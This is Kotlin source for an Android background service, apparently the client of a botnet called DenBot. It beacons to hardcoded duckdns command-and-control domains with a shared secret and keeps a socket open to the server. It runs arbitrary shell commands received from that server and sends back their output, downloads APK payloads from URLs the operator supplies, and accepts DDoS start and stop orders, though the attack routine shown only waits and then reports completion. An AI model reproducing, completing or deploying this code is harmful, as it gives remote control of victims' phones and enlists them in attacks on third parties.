package com.denbot.agent

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*
import java.io.*
import java.net.Socket
import java.util.concurrent.TimeUnit
import org.json.JSONObject

class C2Service : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private var socket: Socket? = null
    private var encoder: PrintWriter? = null
    private var decoder: BufferedReader? = null

    companion object {
        private const val TAG = "DenBot-C2"
        private val BEACON_DOMAINS = listOf(
            "synapsenet.duckdns.org:8443",
            "synapsenet2.duckdns.org:8443",
            "synapsenet666.duckdns.org:8443"
        )
        private const val BEACON_SECRET = "foxden2026"
        private const val C2_SECRET = "foxden2026"
        private const val VERSION = "v4.7-android"
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")
        scope.launch {
            mainLoop()
        }
        return START_STICKY
    }

    private suspend fun mainLoop() {
        while (isActive) {
            try {
                val c2Address = getC2FromBeacon()
                if (c2Address.isNotEmpty()) {
                    Log.d(TAG, "Got C2: $c2Address")
                    connectToC2(c2Address)
                }
                delay(20000)
            } catch (e: Exception) {
                Log.e(TAG, "Main loop error", e)
                delay(15000)
            }
        }
    }

    private suspend fun getC2FromBeacon(): String {
        for (domain in BEACON_DOMAINS) {
            try {
                val url = "https://$domain/beacon"
                val connection = java.net.URL(url).openConnection() as javax.net.ssl.HttpsURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.connectTimeout = 8000
                connection.readTimeout = 8000

                val payload = JSONObject().apply {
                    put("secret", BEACON_SECRET)
                    put("id", android.os.Build.DEVICE + "-" + randomString(6))
                    put("os", "android")
                    put("version", VERSION)
                    put("proxies_count", 0)
                }

                connection.outputStream.write(payload.toString().toByteArray())
                connection.outputStream.flush()

                if (connection.responseCode == 200) {
                    val response = JSONObject(connection.inputStream.bufferedReader().readText())
                    return response.optString("c2", "")
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Beacon request failed for $domain", e)
            }
        }
        return ""
    }

    private suspend fun connectToC2(address: String) {
        try {
            val parts = address.split(":")
            val host = parts[0]
            val port = parts.getOrNull(1)?.toIntOrNull() ?: 4444

            socket = Socket(host, port)
            socket!!.soTimeout = 120000

            encoder = PrintWriter(socket!!.getOutputStream(), true)
            decoder = BufferedReader(InputStreamReader(socket!!.getInputStream()))

            sendHello()
            c2Loop()
        } catch (e: Exception) {
            Log.e(TAG, "C2 connection error", e)
            socket?.close()
        }
    }

    private fun sendHello() {
        val hello = JSONObject().apply {
            put("secret", C2_SECRET)
            put("id", android.os.Build.DEVICE + "-" + randomString(6))
            put("os", "android")
            put("version", VERSION)
        }
        encoder?.println(hello.toString())
    }

    private suspend fun c2Loop() {
        val heartbeatJob = scope.launch {
            while (isActive && encoder != null) {
                try {
                    val hb = JSONObject().apply {
                        put("type", "heartbeat")
                        put("status", "idle")
                    }
                    encoder?.println(hb.toString())
                    delay(60000)
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat error", e)
                    break
                }
            }
        }

        try {
            while (isActive && decoder != null) {
                val line = decoder?.readLine() ?: break
                val cmd = JSONObject(line)
                handleCommand(cmd)
            }
        } catch (e: Exception) {
            Log.e(TAG, "C2 loop error", e)
        } finally {
            heartbeatJob.cancel()
        }
    }

    private suspend fun handleCommand(cmd: JSONObject) {
        val action = cmd.optString("action", "")
        when (action) {
            "start_ddos" -> handleDdos(cmd)
            "shell" -> handleShell(cmd)
            "download_update" -> handleUpdate(cmd)
            "stop_ddos" -> handleStop(cmd)
        }
    }

    private suspend fun handleDdos(cmd: JSONObject) {
        val target = cmd.optString("target", "")
        val duration = cmd.optInt("duration", 0)
        val attackId = cmd.optString("attack_id", "")

        Log.d(TAG, "Attack $attackId on $target for ${duration}s")
        delay((duration * 1000).toLong())

        val response = JSONObject().apply {
            put("type", "attack_complete")
            put("attack_id", attackId)
            put("status", "completed")
        }
        encoder?.println(response.toString())
    }

    private suspend fun handleShell(cmd: JSONObject) {
        val cmdStr = cmd.optString("cmd", "")
        var output = ""
        var error = ""

        try {
            val process = Runtime.getRuntime().exec(arrayOf("/bin/sh", "-c", cmdStr))
            output = process.inputStream.bufferedReader().readText()
            error = process.errorStream.bufferedReader().readText()
            process.waitFor()
        } catch (e: Exception) {
            error = e.message ?: "Unknown error"
        }

        val response = JSONObject().apply {
            put("type", "shell_result")
            put("cmd", cmdStr)
            put("output", output)
            put("error", error)
        }
        encoder?.println(response.toString())
    }

    private suspend fun handleUpdate(cmd: JSONObject) {
        val url = cmd.optString("url", "")
        if (url.isEmpty()) {
            val response = JSONObject().apply {
                put("type", "update_error")
                put("error", "no URL provided")
            }
            encoder?.println(response.toString())
            return
        }

        try {
            val connection = java.net.URL(url).openConnection() as javax.net.ssl.HttpsURLConnection
            connection.connectTimeout = 30000
            connection.readTimeout = 30000

            val tmpFile = cacheDir.absolutePath + "/update.apk"
            val fos = FileOutputStream(tmpFile)
            connection.inputStream.copyTo(fos)
            fos.close()

            val response = JSONObject().apply {
                put("type", "update_complete")
                put("status", "updating")
            }
            encoder?.println(response.toString())

            delay(1000)
            // In production would trigger installation via PackageInstaller
            Log.d(TAG, "Update downloaded to $tmpFile")
        } catch (e: Exception) {
            val response = JSONObject().apply {
                put("type", "update_error")
                put("error", e.message)
            }
            encoder?.println(response.toString())
        }
    }

    private suspend fun handleStop(cmd: JSONObject) {
        val attackId = cmd.optString("attack_id", "")
        Log.d(TAG, "Stopping attack $attackId")
    }

    private fun randomString(length: Int): String {
        val chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        return (1..length).map { chars.random() }.joinToString("")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
        socket?.close()
    }
}
